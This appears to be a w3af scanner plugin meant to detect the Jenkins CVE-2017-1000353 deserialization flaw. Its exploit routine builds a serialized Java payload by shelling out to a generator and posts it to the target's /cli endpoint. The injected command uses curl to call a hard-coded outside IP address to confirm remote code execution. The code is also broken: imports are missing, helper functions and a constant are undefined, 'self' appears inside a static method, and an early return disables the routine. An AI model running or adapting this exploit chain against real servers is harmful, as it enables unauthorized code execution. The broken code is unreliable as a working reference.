from w3af.core.controllers.plugins.infrastructure_plugin import InfrastructurePlugin
from w3af.core.data.request.fuzzable_http_request import FuzzableHTTPRequest
from w3af.core.data.bloomfilter.scalable_bloom import ScalableBloomFilter
from w3af.core.data.dc.headers import Headers
import w3af.core.controllers.output_manager as om

import re, random, string


class cve_2017_1000353(InfrastructurePlugin):
	"""
	Detect CVE 2017-1000353
	"""
	NAME = "CVE 2017-1000353"
	PREAMLE = b'<===[JENKINS REMOTING CAPACITY]===>rO0ABXNyABpodWRzb24ucmVtb3RpbmcuQ2FwYWJpbGl0eQAAAAAAAAABAgABSgAEbWFza3hwAAAAAAAAAH4='
	PROTO = b'\x00\x00\x00\x00'
	FILE_SER = b''

	def __init__(self):
		InfrastructurePlugin.__init__(self)
		self._already_tested_dirs = ScalableBloomFilter()
		self._jenkin_dirs = set()

	def discover(self, fuzzable_http_request):
		for u in fuzzable_http_request.get_url().get_directories():
			if u.url_string not in self._already_tested_dirs:
				for d in self._jenkin_dirs:
					if d in u:
						break
				else:
					self._already_tested_dirs.add(u.url_string)
					self.exploit(u)

	@staticmethod
	def gen_token():
		a = ''
		for i in range(32):
			a += str(random.randint(0,9))
		return a

	@staticmethod
	def gen_ser(cmd):
		tmp_ser = "/tmp/jenkins_poc.ser"
		command = 'java -jar {} {} "{}"'.format(cve_2017_1000353.PAYLOAD_GENERATOR, tmp_ser, cmd)
		os.system(command)
		with open(tmp_ser, "rb") as f:
			self.SER = f.read()

	def exploit(self, url):
		return
		url = url + '/cli'
		token = self.gen_token()
		cmd = 'curl -d "token='+ token +'" http://45.76.183.229/testwls/'
		print cmd
		self.gen_ser(cmd)
		session = str(uuid.uuid4())
		t = threading.Thread(target=download,args=(url,session))
		t.start()
		time.sleep(1)
		upload_chunked(url,session)
		time.sleep(2)
		dectect_part = requests.get("http://45.76.183.229/testwls/list_url_exploited")
		time.sleep(2)
		print dectect_part.text
		if dectect_part.text == token:
			return True
		else:
			return False
